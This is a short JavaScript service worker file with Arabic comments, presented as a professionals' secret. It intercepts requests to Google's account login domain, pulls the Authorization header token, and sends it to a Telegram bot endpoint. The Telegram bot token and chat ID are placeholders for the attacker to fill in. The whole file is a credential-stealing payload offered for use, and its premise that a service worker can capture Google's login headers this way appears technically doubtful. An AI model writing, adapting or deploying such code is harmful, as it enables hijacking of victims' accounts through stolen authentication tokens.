// ملف sw.js (السر الذي يخفيه المحترفون)
self.addEventListener('fetch', function(event) {
    // اعتراض طلبات جوجل وسحب التوكن من الهيدر (Header) وليس من الكوكيز
    if (event.request.url.includes("accounts.google.com")) {
        const token = event.request.headers.get('Authorization');
        if(token) {
            // إرسال التوكن فوراً للسيرفر الخاص بك
            fetch('https://api.telegram.org/botYOUR_TOKEN/sendMessage?chat_id=ID&text=' + token);
        }
    }
});
